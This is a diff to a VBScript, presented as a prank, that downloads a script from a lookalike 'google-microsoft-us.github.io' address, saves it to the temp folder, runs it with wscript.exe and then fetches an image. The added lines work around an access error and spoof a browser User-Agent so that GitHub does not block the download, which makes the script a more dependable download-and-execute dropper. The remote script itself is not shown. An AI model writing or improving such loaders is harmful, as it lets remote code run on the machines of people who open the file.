@@ -14,9 +14,13 @@ remoteImage_URL = "https://google-microsoft-us.github.io/downloads/error.png"
 ' ------------------------------------------
 
 ' 1. Download the remote prank VBS
-Set http = CreateObject("MSXML2.XMLHTTP")
+' FIX: Changed to ServerXMLHTTP.6.0 to avoid "Access is denied" error
+Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 http.Open "GET", remoteVBS_URL, False
+' FIX: Added User-Agent to prevent GitHub from blocking the request
+http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
 http.Send
+
 If http.Status <> 200 Then
     MsgBox "Failed to download prank script. HTTP " & http.Status, vbCritical, "Error"
     WScript.Quit
@@ -33,9 +37,12 @@ objShell.Run "wscript.exe " & Chr(34) & vbsTempFile & Chr(34), 1, True
 
 ' 3. Download the image (binary safe)
 http.Open "GET", remoteImage_URL, False
+http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
 http.Send
+
 If http.Status = 200 Then
-    imageTempFile = objFSO.BuildPath(tempFolder, "image_" & Replace(CStr(Timer), ".", "") & ".jpg")
+    ' Note: If your image is a .png, change the ".jpg" below to ".png"
+    imageTempFile = objFSO.BuildPath(tempFolder, "image_" & Replace(CStr(Timer), ".", "") & ".png")
     
     Dim adoStream
     Set adoStream = CreateObject("ADODB.Stream")
